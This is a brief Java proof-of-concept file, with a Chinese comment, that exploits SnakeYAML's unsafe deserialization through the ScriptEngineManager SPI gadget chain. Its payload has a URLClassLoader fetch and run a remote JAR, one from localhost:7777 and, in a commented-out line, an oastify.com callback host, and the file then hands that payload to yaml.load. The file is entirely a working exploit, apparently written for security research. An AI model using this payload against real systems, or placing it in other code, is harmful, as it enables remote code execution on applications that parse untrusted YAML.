package AvailableGadgets;

import org.yaml.snakeyaml.Yaml;

// 利用 SPI 机制 - 基于 ScriptEngineManager 利用链

public class SPInScriptEngineManagerEXP {
    public static void main(String[] args) {
//        String payload = "!!javax.script.ScriptEngineManager " +
//                "[!!java.net.URLClassLoader " +
//                "[[!!java.net.URL [\"http://ne54u1uv8ygp87bbl3fc5gvvsmycm1.oastify.com\"]]]]\n";

        String payload = "!!javax.script.ScriptEngineManager " +
                "[!!java.net.URLClassLoader " +
                "[[!!java.net.URL [\"http://localhost:7777/yaml-payload.jar\"]]]]\n";
        Yaml yaml = new Yaml();
        yaml.load(payload);
    }
}
